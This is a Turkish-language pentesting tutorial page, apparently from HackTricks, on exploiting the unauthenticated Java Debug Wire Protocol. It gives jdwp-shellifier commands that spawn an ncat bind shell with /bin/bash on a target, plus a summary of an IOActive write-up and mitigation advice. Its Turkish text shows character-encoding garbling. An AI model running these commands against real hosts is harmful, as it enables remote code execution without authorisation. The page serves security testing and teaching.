# JDWP Pentesting - Java Debug Wire Protocol

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan ileri seviyeye taÅŸÄ±yÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## SÃ¶mÃ¼rme

JDWP sÃ¶mÃ¼rÃ¼sÃ¼, **protokolÃ¼n kimlik doÄŸrulama ve ÅŸifreleme eksikliÄŸine** dayanÄ±r. Genellikle **8000 numaralÄ± portta** bulunur, ancak diÄŸer portlar da mÃ¼mkÃ¼ndÃ¼r. Ä°lk baÄŸlantÄ±, hedef porta "JDWP-Handshake" gÃ¶ndererek yapÄ±lÄ±r. EÄŸer bir JDWP hizmeti etkinse, aynÄ± dizeyle yanÄ±t vererek varlÄ±ÄŸÄ±nÄ± doÄŸrular. Bu el sÄ±kÄ±ÅŸmasÄ±, aÄŸdaki JDWP hizmetlerini tanÄ±mlamak iÃ§in bir parmak izi yÃ¶ntemi olarak iÅŸlev gÃ¶rÃ¼r.

SÃ¼reÃ§ tanÄ±mlamasÄ± aÃ§Ä±sÄ±ndan, Java sÃ¼reÃ§lerinde "jdwk" dizesini aramak, etkin bir JDWP oturumunu gÃ¶sterebilir.

En yaygÄ±n kullanÄ±lan araÃ§ [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier)'dÄ±r. FarklÄ± parametrelerle kullanabilirsiniz:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
`--break-on 'java.lang.String.indexOf'` kullanÄ±mÄ±nÄ±n saldÄ±rÄ±yÄ± daha **istikrarlÄ±** hale getirdiÄŸini buldum. Ve eÄŸer bir ana bilgisayara bir arka kapÄ± yÃ¼klemek ve bunun yerine bir komut Ã§alÄ±ÅŸtÄ±rmak iÃ§in ÅŸansÄ±nÄ±z varsa, saldÄ±rÄ± daha da istikrarlÄ± olacaktÄ±r.

## Daha Fazla Detay

**Bu, [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/) adresindeki bir Ã¶zetidir**. Daha fazla ayrÄ±ntÄ± iÃ§in kontrol edin.


1. **JDWP Genel BakÄ±ÅŸ**:
- Paket tabanlÄ± bir aÄŸ ikili protokoldÃ¼r, temel olarak senkroniktir.
- Kimlik doÄŸrulama ve ÅŸifreleme eksikliÄŸi, dÃ¼ÅŸmanca aÄŸlara maruz kaldÄ±ÄŸÄ±nda savunmasÄ±z hale getirir.

2. **JDWP El SÄ±kÄ±ÅŸmasÄ±**:
- Ä°letiÅŸimi baÅŸlatmak iÃ§in basit bir el sÄ±kÄ±ÅŸma sÃ¼reci kullanÄ±lÄ±r. Hata AyÄ±klayÄ±cÄ± (istemci) ve Hata AyÄ±klanan (sunucu) arasÄ±nda "JDWP-Handshake" adÄ±nda 14 karakterlik bir ASCII dizesi alÄ±ÅŸveriÅŸi yapÄ±lÄ±r.

3. **JDWP Ä°letiÅŸimi**:
- Mesajlar Uzunluk, Kimlik, Bayrak ve KomutSeti gibi alanlara sahip basit bir yapÄ±ya sahiptir.
- KomutSeti deÄŸerleri 0x40 ile 0x80 arasÄ±nda deÄŸiÅŸir ve farklÄ± eylemleri ve olaylarÄ± temsil eder.

4. **SÃ¶mÃ¼rÃ¼**:
- JDWP, keyfi sÄ±nÄ±flarÄ±n ve baytlarÄ±n yÃ¼klenmesine ve Ã§aÄŸrÄ±lmasÄ±na izin verir, bu da gÃ¼venlik riskleri oluÅŸturur.
- Makale, Java Runtime referanslarÄ±nÄ± almak, kesme noktalarÄ±nÄ± ayarlamak ve yÃ¶ntemleri Ã§aÄŸÄ±rmak gibi beÅŸ adÄ±mdan oluÅŸan bir sÃ¶mÃ¼rÃ¼ sÃ¼recini detaylandÄ±rÄ±yor.

5. **GerÃ§ek Hayat SÃ¶mÃ¼rÃ¼sÃ¼**:
- Potansiyel gÃ¼venlik duvarÄ± korumalarÄ±na raÄŸmen, JDWP hizmetleri ShodanHQ ve GitHub gibi platformlarda arama yapÄ±larak gerÃ§ek dÃ¼nya senaryolarÄ±nda keÅŸfedilebilir ve sÃ¶mÃ¼rÃ¼lebilir.
- SÃ¶mÃ¼rÃ¼ betiÄŸi Ã§eÅŸitli JDK sÃ¼rÃ¼mleri Ã¼zerinde test edildi ve platform baÄŸÄ±msÄ±zdÄ±r, gÃ¼venilir Uzaktan Kod YÃ¼rÃ¼tme (RCE) sunar.

6. **GÃ¼venlik SonuÃ§larÄ±**:
- Ä°nternette aÃ§Ä±k JDWP hizmetlerinin varlÄ±ÄŸÄ±, dÃ¼zenli gÃ¼venlik incelemeleri yapma, Ã¼retimde hata ayÄ±klama iÅŸlevlerini devre dÄ±ÅŸÄ± bÄ±rakma ve uygun gÃ¼venlik duvarÄ± yapÄ±landÄ±rmalarÄ± yapma ihtiyacÄ±nÄ± vurgular.


### **Referanslar:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek **hacking hilelerinizi paylaÅŸÄ±n**.

</details>
